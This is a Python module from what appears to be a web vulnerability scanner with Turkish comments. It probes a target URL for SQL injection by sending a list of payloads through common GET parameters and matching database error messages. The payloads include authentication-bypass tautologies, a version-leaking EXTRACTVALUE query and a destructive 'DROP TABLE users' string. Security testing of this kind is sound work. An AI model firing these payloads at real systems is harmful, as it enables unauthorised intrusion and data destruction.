# modules/sql_injection.py
"""
SQL Injection Tarama Modülü
Severity: Critical
"""

import re
import time
from modules.utils import RequestHandler

class Scanner:
    """SQL Injection açıklarını tespit eder"""

    NAME = "SQL Injection"
    DESCRIPTION = "SQL Injection açıklarını tespit eder"
    SEVERITY = "Critical"

    # SQL Injection payload'ları
    PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' OR 'x'='x",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--",
        "'; DROP TABLE users;--",
    ]

    # Hata mesajları
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.*SQL.*Server",
        r"OLE DB.*SQL Server",
        r"(\W|^)SQL.*Server.*Driver",
        r"Warning.*mssql_.*",
        r"(\W|^)SQL.*Server.*[0-9a-fA-F]{8}",
        r"Exception.*Oracle",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_.*",
        r"Microsoft.*OLE.*DB.*Oracle",
    ]

    def __init__(self, target_url, proxy=None):
        self.target_url = target_url
        self.request_handler = RequestHandler(proxy)
        self.findings = []

    def scan(self):
        """Taramayı çalıştır"""
        result = {
            'module': self.NAME,
            'vulnerable': False,
            'findings': [],
            'tested_payloads': 0
        }

        # Test edilecek parametreler
        test_params = ['id', 'page', 'cat', 'product', 'item', 'news', 'article']

        for param in test_params:
            for payload in self.PAYLOADS:
                test_url = f"{self.target_url}?{param}={payload}"
                response = self.request_handler.get(test_url)

                if response:
                    result['tested_payloads'] += 1

                    # Hata mesajı kontrolü
                    for pattern in self.ERROR_PATTERNS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            finding = {
                                'type': 'SQL Injection',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'SQL error message detected',
                                'severity': self.SEVERITY
                            }
                            result['findings'].append(finding)
                            result['vulnerable'] = True
                            break

                time.sleep(0.3)

        return result
